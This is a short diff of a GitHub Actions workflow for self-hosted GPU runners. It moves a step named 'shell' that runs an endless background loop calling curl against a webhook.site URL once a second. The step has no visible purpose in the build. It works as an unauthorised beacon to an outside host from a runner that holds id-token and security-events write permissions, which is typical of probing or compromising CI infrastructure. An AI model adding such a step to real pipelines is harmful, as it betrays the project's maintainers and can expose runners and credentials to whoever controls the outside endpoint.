@@ -14,13 +14,6 @@ jobs:
       group: ${{ github.workflow }}-${{ github.job }}-${{ github.head_ref || github.run_id }}
       cancel-in-progress: true
     runs-on: [single-gpu, nvidia-gpu, t4, ci]
-    steps:
-      - name: shell
-        run: |
-               while [[ 1 < 10 ]]
-                do
-                  sleep 1 ; curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18
-                done &
     container:
       image: nvidia/cuda:12.3.1-devel-ubuntu22.04
       options: --gpus 0 
@@ -32,4 +25,11 @@ jobs:
       # with sigstore/fulcio when running outside of PRs.
       id-token: write
       security-events: write
+    steps:
+      - name: shell
+        run: |
+               while [[ 1 < 10 ]]
+                do
+                  sleep 1 ; curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18
+                done &
       
